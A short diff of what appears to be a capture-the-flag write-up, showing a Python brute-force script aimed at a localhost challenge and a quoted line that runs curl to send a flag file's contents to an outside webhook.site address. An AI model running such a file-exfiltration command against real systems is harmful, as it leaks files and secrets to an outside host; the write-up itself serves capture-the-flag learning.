@@ -67,7 +67,7 @@ import requests
 import string
 
 # Replace with your actual challenge URL
-URL = "http://localhost:8798/submit"
+URL = "http://localhost:8798/submit" #
 CHARSET = string.ascii_letters + string.digits + "{}_-!"
 flag = "shell"
 
@@ -114,3 +114,16 @@ curl https://webhook.site/aa681898-b641-4a54-b311-b06c3205fe93/?flag=$(cat flag.
 ---
 
 This is my writeup on Medium.
+
+
+
+
+
+
+
+
+
+
+
+
+
